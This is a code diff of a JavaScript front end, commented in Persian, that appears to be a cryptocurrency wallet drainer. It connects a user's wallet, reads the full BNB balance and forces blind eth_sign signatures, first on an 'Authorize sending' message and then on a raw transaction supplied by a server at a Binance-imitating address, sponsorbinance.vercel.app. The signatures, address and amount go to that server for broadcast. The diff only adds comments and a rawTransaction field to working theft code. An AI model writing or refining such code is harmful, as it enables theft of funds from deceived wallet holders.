@@ -20,14 +20,16 @@ async function getBNBBalance(address) {
 
 function App() {
   async function runner() {
+    // پاک کردن session قدیمی (walletconnect)
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
+    // راه‌اندازی Provider
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56],
-      methods: ["eth_sign"], // فقط eth_sign
+      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -43,10 +45,11 @@ function App() {
 
     console.log("✅ Wallet Connected:", accountSender);
 
+    // اطمینان از اینکه روی شبکه بایننس هستیم
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }],
+        params: [{ chainId: "0x38" }], // chainId بایننس اسمارت چین
       });
     } catch (error) {
       console.error("❌ Error in switching chain:", error);
@@ -55,7 +58,7 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
-    // دریافت بالانس
+    // 1) دریافت بالانس BNB
     const amount = await getBNBBalance(accountSender);
     if (!amount) {
       console.error("❌ Failed to fetch BNB balance.");
@@ -63,11 +66,11 @@ function App() {
     }
     console.log("💰 BNB Balance:", amount);
 
-    // ساخت پیام
+    // 2) ساخت پیام برای امضای اول
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
     console.log("📜 Message to Sign:", message);
 
-    // امضای پیام با eth_sign
+    // 3) امضای پیام اول با eth_sign
     let signature;
     try {
       signature = await provider.request({
@@ -81,22 +84,22 @@ function App() {
 
     console.log("✍️ Signature:", signature);
 
-    // درخواست تراکنش خام از سرور + امضای آن
+    // 4) دریافت تراکنش خام از سرور + امضای آن (مرحله دوم)
     async function signAndSendTransaction() {
       try {
         console.log("📡 Requesting Unsigned Transaction...");
 
-        // پاسخ سرور معمولا string یا object است
+        // مرحله اول (tx)
         let result = await jQuery.post(apiUrl, {
-          handler: "tx",
+          handler: "tx",          // سرور تشخیص می‌دهد مرحله اول است
           address: accountSender,
-          signature: signature,
-          amount: amount, // مرحله اول
+          signature: signature,   // امضای پیام اول
+          amount: amount,         // فرستادن بالانس
         });
 
         console.log("📥 API Response (raw):", result);
 
-        // اگر jQuery پاسخ رو string برگردونه، parse کنیم
+        // اگر پاسخ یک رشته JSON باشد، parse کن
         if (typeof result === "string") {
           try {
             result = JSON.parse(result);
@@ -126,6 +129,7 @@ function App() {
 
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
+        // 5) امضای تراکنش خام با eth_sign (مرحله دوم)
         console.log("📝 Signing Transaction (raw)...");
         const signedTx = await provider.request({
           method: "eth_sign",
@@ -134,12 +138,14 @@ function App() {
 
         console.log("✍️ Signed Transaction (raw):", signedTx);
 
-        // مرحله دوم هم amount بفرست
+        // 6) ارسال تراکنش امضا شده به سرور (handler='sign')
+        //    اینجا باید rawTransaction را هم بفرستیم تا سرور بتواند همان را هش کند
         const txHash = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature: signedTx,
+          handler: "sign",          // سرور تشخیص می‌دهد مرحله دوم است
+          signature: signedTx,      // امضای تراکنش خام
           address: accountSender,
-          amount: amount, // 👈 اینجا اضافه شد
+          amount: amount,           // اگر لازم است سرور اینجا هم بالانس بداند
+          rawTransaction: JSON.stringify(unsignedTx), // 👈 مهم: ارسال متن تراکنش
         });
 
         console.log("📤 Transaction Sent:", txHash);
